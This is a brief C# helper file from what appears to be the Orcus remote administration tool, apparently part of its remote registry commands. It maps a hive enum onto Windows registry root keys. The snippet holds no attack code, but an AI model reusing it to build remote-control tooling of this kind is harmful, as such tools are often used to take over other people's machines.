using System;
using Microsoft.Win32;
using RegistryHive = Orcus.Shared.Commands.Registry.RegistryHive;

namespace Orcus.Service.Extensions
{
    internal static class RegistryExtensions
    {
        public static RegistryKey OpenRegistry(RegistryHive registryHive)
        {
            switch (registryHive)
            {
                case RegistryHive.ClassesRoot:
                    return Registry.ClassesRoot;
                case RegistryHive.CurrentUser:
                    return Registry.CurrentUser;
                case RegistryHive.LocalMachine:
                    return Registry.LocalMachine;
                case RegistryHive.Users:
                    return Registry.Users;
                case RegistryHive.CurrentConfig:
                    return Registry.CurrentConfig;
                default:
                    throw new ArgumentOutOfRangeException(nameof(registryHive), registryHive, null);
            }
        }
    }
}